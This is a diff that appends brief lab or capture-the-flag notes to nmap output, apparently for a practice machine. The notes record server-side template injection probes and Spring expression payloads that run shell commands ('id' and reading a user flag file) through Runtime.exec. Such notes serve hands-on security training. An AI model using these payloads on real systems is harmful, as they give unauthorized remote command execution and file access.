@@ -118,3 +118,19 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 78.25 seconds
+
+#ip http://10.10.11.170:8080/
+http://10.10.11.170:8080/stats?author=
+
+#SSTI url http://10.10.11.170:8080/search
+ #{7*7}
+
+ ou
+
+*{7*7}
+
+#Spring framework java
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+# flag user.txt
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /home/woodenk/user.txt').getInputStream())}
